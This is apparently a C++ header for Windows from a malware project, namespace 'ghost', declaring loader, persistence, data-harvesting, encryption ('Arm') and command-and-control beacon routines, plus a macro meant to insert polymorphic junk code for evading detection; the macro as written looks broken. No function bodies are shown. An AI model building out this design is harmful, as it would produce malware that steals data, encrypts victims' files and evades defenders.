#pragma once

#include <windows.h>
#include <cstdint>
#include <atomic>

namespace ghost {

    extern std::atomic<bool> g_Shutdown;

    bool Init();
    
    void Pulse(); 
    void Terminate();

    namespace loader      { bool Activate(); }
    namespace persistence { bool Anchor();   }
    
    namespace collector   { void Harvest();  }
    namespace crypto      { void Arm();      }
    namespace c2          { void Beacon();   }

}

#define POLY_JUNK(seed) \
    if constexpr ((POLY_SEED ^ (seed)) != 0) { volatile int _junk = 0x"##seed##"; (void)_junk; }